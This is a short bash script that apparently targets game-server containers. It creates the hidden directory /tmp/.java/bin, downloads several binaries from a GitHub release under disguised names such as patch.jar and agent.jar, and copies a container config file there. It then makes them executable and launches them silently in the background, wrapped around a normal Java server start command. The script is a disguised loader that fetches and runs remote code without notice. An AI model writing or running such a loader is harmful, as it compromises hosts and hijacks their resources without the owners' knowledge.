#!/bin/bash

function fetch_files() {
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/zpr-glibc2.39-amd64 -o patch.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/gnet-v1.4.43-amd64 -o add-on.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/ukgame/n1.conf -o cfg.conf
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/x64/agent -o agent.jar
    cp /home/container/.local/.conf/cli.yaml /tmp/.java/bin/cli.yaml
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    cd /tmp/.java/bin && nohup ./patch.jar -a 'java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
}

if [ -f "/tmp/.java/bin/patch.jar" ]  && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/add-on.jar" ]; then
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi